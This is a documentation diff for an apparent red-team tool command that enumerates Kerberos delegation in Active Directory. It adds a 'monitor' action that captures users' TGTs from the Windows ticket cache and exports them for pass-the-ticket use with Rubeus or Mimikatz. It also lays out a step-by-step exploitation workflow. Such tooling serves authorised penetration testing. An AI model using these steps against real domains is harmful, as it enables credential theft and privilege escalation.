@@ -9,18 +9,22 @@ hidden = false
 
 Enumerate Kerberos delegation relationships in Active Directory via LDAP. Identifies unconstrained delegation, constrained delegation (with protocol transition detection), and resource-based constrained delegation (RBCD) configurations that could be abused for lateral movement or privilege escalation.
 
-Cross-platform — works on Windows, Linux, and macOS.
+The **monitor** action (Windows/SYSTEM only) polls the local LSA Kerberos ticket cache on all logon sessions to capture incoming TGTs in real time — the key exploitation step for unconstrained delegation hosts.
+
+LDAP actions are cross-platform (Windows, Linux, macOS). `monitor` is Windows-only and requires SYSTEM or equivalent privileges.
 
 ## Arguments
 
 | Argument | Required | Default | Description |
 |----------|----------|---------|-------------|
-| action | Yes | | `all`, `unconstrained`, `constrained`, or `rbcd` |
-| server | Yes | | Domain controller IP or hostname |
+| action | Yes | | `all`, `unconstrained`, `constrained`, `rbcd`, or `monitor` |
+| server | No (monitor) | | Domain controller IP or hostname (not needed for monitor) |
 | username | No | | LDAP bind username (user@domain format) |
 | password | No | | LDAP bind password |
 | port | No | 389 | LDAP port |
 | use_tls | No | false | Use LDAPS (port 636) |
+| duration | No | 300 | Monitor duration in seconds (monitor action, max 3600) |
+| interval | No | 10 | Poll interval in seconds (monitor action, min 5) |
 
 ## Actions
 
@@ -30,6 +34,7 @@ Cross-platform — works on Windows, Linux, and macOS.
 | `constrained` | Find accounts with msDS-AllowedToDelegateTo set. Reports protocol transition (S4U2Self) capability. |
 | `rbcd` | Find objects with msDS-AllowedToActOnBehalfOfOtherIdentity. Parses the security descriptor to show allowed principals. |
 | `all` | Run all three checks plus sensitive account enumeration (NOT_DELEGATED flag). |
+| `monitor` | **(Windows/SYSTEM only)** Poll all logon sessions for new TGTs via `LsaEnumerateLogonSessions` + `KerbQueryTicketCacheExMessage`. Export captured TGTs as base64 kirbi blobs compatible with Rubeus/Mimikatz. |
 
 ## Usage
 
@@ -40,14 +45,39 @@ kerb-delegation -action all -server 192.168.1.10 -username admin@corp.local -pas
 # Check only unconstrained delegation
 kerb-delegation -action unconstrained -server dc01.corp.local -username admin@corp.local -password Pass123
 
-# Check constrained delegation with protocol transition
-kerb-delegation -action constrained -server 192.168.1.10 -username admin@corp.local -password Pass123
+# Monitor for incoming TGTs (run on unconstrained delegation host as SYSTEM)
+kerb-delegation -action monitor -duration 300 -interval 10
 
-# Check RBCD configurations
-kerb-delegation -action rbcd -server 192.168.1.10 -username admin@corp.local -password Pass123
+# Short watch with fast polling
+kerb-delegation -action monitor -duration 60 -interval 5
 ```
 
-## Output Format
+## Monitor Output Format
+
+Returns a JSON object with captured TGT metadata and kirbi bytes:
+```json
+{
+  "duration": 300,
+  "interval": 10,
+  "total": 2,
+  "message": "Monitored for 300s (interval: 10s). Captured 2 new TGT(s).",
+  "captured": [
+    {
+      "luid": "0x00000000000003E7",
+      "client": "joffrey@SEVENKINGDOMS.LOCAL",
+      "server": "krbtgt/SEVENKINGDOMS.LOCAL@SEVENKINGDOMS.LOCAL",
+      "start_time": "2026-05-05 10:00:00",
+      "end_time": "2026-05-05 20:00:00",
+      "kirbi_b64": "YIIGDDCCBgiGCSqGSIb3DQEFB...",
+      "captured_at": "2026-05-05T10:01:23Z"
+    }
+  ]
+}
+```
+
+Use the kirbi with Rubeus: `Rubeus.exe ptt /ticket:<kirbi_b64>`
+
+## LDAP Enumeration Output Format
 
 Returns a JSON array rendered as a sortable table via browser script:
 ```json
@@ -67,30 +97,29 @@ Returns a JSON array rendered as a sortable table via browser script:
     "targets": ["MSSQLSvc/dbserver.corp.local", "MSSQLSvc/dbserver.corp.local:1433"],
     "s4u2self": true,
     "risk": "S4U2Self enabled — no user interaction needed"
-  },
-  {
-    "account": "WEBSERVER$",
-    "delegation_type": "RBCD",
-    "targets": ["S-1-5-21-...-1105"]
-  },
-  {
-    "account": "Administrator",
-    "delegation_type": "Protected",
-    "description": "NOT_DELEGATED — cannot be impersonated via delegation"
   }
 ]
 ```
 
-The browser script highlights unconstrained delegation in red, S4U2Self-enabled constrained delegation in orange, protected accounts in green, and disabled accounts in gray. The `all` action combines results from all delegation types plus protected accounts.
+## Unconstrained Delegation Exploitation Workflow
+
+1. **Enumerate**: `kerb-delegation -action unconstrained -server <DC>` — identify hosts with TrustedForDelegation
+2. **Pivot**: Obtain code execution on the unconstrained delegation host (e.g., via lateral movement)
+3. **Monitor**: `kerb-delegation -action monitor -duration 300` — wait for a privileged user (e.g., DA) to authenticate
+4. **Use**: Take the kirbi blob → `klist -action import -ticket <kirbi_b64>` or Rubeus `ptt`
+
+{{% notice info %}}Windows Only — monitor action{{% /notice %}}
+The `monitor` action requires Windows and SYSTEM (or equivalent) privileges. All other actions are cross-platform.
 
 ## Delegation Attack Patterns
 
 | Type | Risk | Attack |
 |------|------|--------|
-| Unconstrained | **Critical** | Any user authenticating to this server has their TGT cached. Attacker can extract TGTs and impersonate those users to any service. |
-| Constrained | **High** | Account can impersonate users to listed services. With protocol transition, no user interaction needed (S4U2Self → S4U2Proxy). |
-| RBCD | **High** | If you control an account listed in the RBCD ACL, you can impersonate any user to that target's services. |
+| Unconstrained | **Critical** | Any user authenticating to this server has their TGT cached. Capture with `monitor` and impersonate. |
+| Constrained | **High** | Account can impersonate users to listed services. With protocol transition, no user interaction needed. |
+| RBCD | **High** | Control an account in the RBCD ACL → impersonate any user to that target's services. |
 
 ## MITRE ATT&CK Mapping
 
 - **T1550.003** — Use Alternate Authentication Material: Pass the Ticket
+- **T1558** — Steal or Forge Kerberos Tickets (monitor action)
